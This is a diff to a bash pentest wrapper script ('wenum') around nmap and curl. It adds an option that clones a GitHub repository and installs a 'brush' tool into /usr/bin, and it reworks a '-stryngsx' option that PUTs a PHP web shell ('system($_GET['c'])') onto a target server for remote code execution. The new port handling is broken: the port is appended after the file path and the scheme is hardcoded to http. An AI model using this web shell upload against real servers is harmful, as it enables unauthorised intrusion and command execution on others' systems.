@@ -12,6 +12,7 @@ echo "-la                           Search through all NSE Scripts"
 echo "-hv                           Run all HTTP Vuln NSE's against target"
 echo "-s                            Run the Full Powerhouse Suite"
 echo "-cs                           Run NSE Script against Target"
+echo "-b                            Run Brush Script against Target"
 echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
 echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>"
 exit 0
@@ -37,6 +38,7 @@ for arg; do
             echo "-hv                           Run all HTTP Vuln NSE's against target"
             echo "-s                            Run the Full Powerhouse Suite"
             echo "-cs                           Run NSE Script against Target"
+            echo "-b                            Run Brush Script against Target"
             echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
             echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>"                
             exit 0 ;;
@@ -102,9 +104,24 @@ for arg; do
         -stryngs) curl -X OPTIONS $1 -v
             exit 0 ;;
         -stryngsx) read -p "<Enter file to PUT RCE>: " CONDITION;
-            read -p "<HTTP or HTTPS>: " CONDITIONL;
-            echo "[*] Executing curl -X PUT -d '<?php system($_GET['c']);' $CONDITIONL://$1/$CONDITION"
-            curl -X PUT -d '<?php system($_GET["c"]);' http://$1/$CONDITION           
+            read -p "<Enter port to use>: " PORT;
+            if [ "$PORT" == "443" ] || [ "$PORT" == "80" ] ; then 
+                 if [ "$PORT" == "443" ]; then
+                      CONDITIONL=https
+                 else
+                      CONDITIONL=http
+                 fi  
+            else
+                 read -p "<SSL - y/N>: " CONDITIONY;
+                 if [ "$CONDITIONY" == y ] || [ "$CONDITIONY" == Y ]; then
+                      CONDITIONL=https
+                 else
+                      CONDITIONL=http
+                 fi 
+            fi
+            CONDITIONX=$(echo "$1" | cut -d"/" -f3)
+            echo "[*] Executing curl -X PUT -d '<?php system($_GET['c']);' $CONDITIONL://$CONDITIONX/$CONDITION:$PORT"
+            curl -X PUT -d '<?php system($_GET["c"]);' http://$CONDITIONX/$CONDITION:$PORT           
             exit 0 ;;
         -hv) if [ "$1" == "-hv" ]; then
                  echo "[*] Error! Must be used with a target or range."
@@ -135,6 +152,33 @@ for arg; do
             nmap -p$PORT -script $SCRIPT $1 --open
             fi 
             exit 0;;
+        -b) if [ "$1" == "-b" ]; then
+            echo "[*] Runs Brush on Hostname(Installs if not already-requires pip and git)"
+            echo "[*] Ex:wenum google.com -b"
+            else
+            if [ ! -f /usr/bin/brush ]; then
+            echo "[*] Brush Not Found! Installing now."
+            git clone https://github.com/stryngs/cpc.git
+            echo "[*] Moving to /usr/bin"
+            mv cpc/brush /usr/bin
+            echo "[*] Installing PythonWhoIs"
+            pip install pythonwhois
+            echo "[*] Installing IPWhoIs"
+            pip install ipwhois
+            echo "[*] Cleaning up"
+            rm -R cpc
+            echo "[*] Installed!  Running Scan Now!"
+            brush -n $1
+            wait
+            echo "[*] Check clients.sqlite file for results. Reccinebded SQLite Browser"
+            else
+            echo "[*] Running Brush"
+            brush -n $1
+            wait
+            echo "[*] Check clients.sqlite file for results. Reccomended SQLite Browser"
+            fi
+            fi 
+            exit 0;;
         -*) echo "[*] Nmap Full Vuln Scan"
             echo "[*] Usage: wenum <target> -options"
             echo "options:"
@@ -144,6 +188,7 @@ for arg; do
             echo "-hv                           Run all HTTP Vuln NSE's against target"
             echo "-s                            Run the Full Powerhouse Suite"
             echo "-cs                           Run NSE Script against Target"
+            echo "-b                            Run Brush Script against Target"
             echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
             echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>"  
             exit 0;;
